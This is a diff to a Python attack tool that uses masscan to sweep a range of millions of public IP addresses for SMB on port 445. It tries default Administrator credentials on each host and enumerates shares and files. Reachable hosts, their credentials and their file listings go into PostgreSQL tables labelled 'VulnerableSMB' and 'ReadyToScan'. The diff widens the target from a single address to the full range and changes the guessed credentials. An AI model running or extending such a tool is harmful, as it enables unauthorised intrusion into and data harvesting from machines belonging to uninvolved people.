@@ -21,7 +21,7 @@ end = '\033[0m'
 
 
 def get_pipe():
-    args = ['masscan', '96.2.213.179', '-p', '445', '--rate', '250', '--connection-timeout', '8']
+    args = ['masscan', '70.50.0.0-73.255.255.255', '-p', '445', '--rate', '250', '--connection-timeout', '8']
     process = Popen(args, stdout=PIPE)
     dialects = [785, 770, 768, 528, 514, 767]
 
@@ -65,11 +65,11 @@ def dumps_dir(ip, port, username, password, client, domain):
                 print(f'{green}[+]{end} [{ip}] : {x} : {lib_dir_v2[2:5]} : More info on a host')
 
                 for file in lib_dir_v2[2:]:
-                    all_files += str(file)
+                    all_files += str(file.replace("'", ""))
                     all_files += '/'
 
                 # Adding all opened dirs and files
-                AddHosts().appendHostPostgreSQL('VulnerableSMB', ip, port, username, password, str(x), all_files)
+                AddHosts().appendFilesHostPostgreSQL('VulnerableSMB', ip, port, username, password, str(x), all_files)
             except OperationFailure:
                 print(f'{fail}[-]{end} [{ip}] : Authentication aborted on {x} ')
                 pass
@@ -82,7 +82,7 @@ def dumps_dir(ip, port, username, password, client, domain):
             string += '/'
 
         # Create PostgreSQL request to add all found information
-        AddHosts().appendHostPostgreSQL('ReadyToScan', ip, port, username, password, string)
+        AddHosts().appendDirsHostPostgreSQL('ReadyToScan', ip, port, username, password, string)
 
     except TimeoutError as ex:
         print(f'{fail}[-]{end} Timeout: {ip}, {ex} ')
@@ -107,7 +107,7 @@ def smb_checker(host, port, timeout, dialects_int):
             if success != '':
                 count[y] += 1
                 print(f'{green}[+]\t{end} [{x}] \t[0] : {conn}, Dialect version: {y}')
-                dumps_dir(str(host), port, 'Admin', 'Admin', 'Administrator', '.')
+                dumps_dir(str(host), port, 'Administrator', 'Administrator', 'Administrator', '.')
                 break
 
         except (ValueError, TypeError) as err:
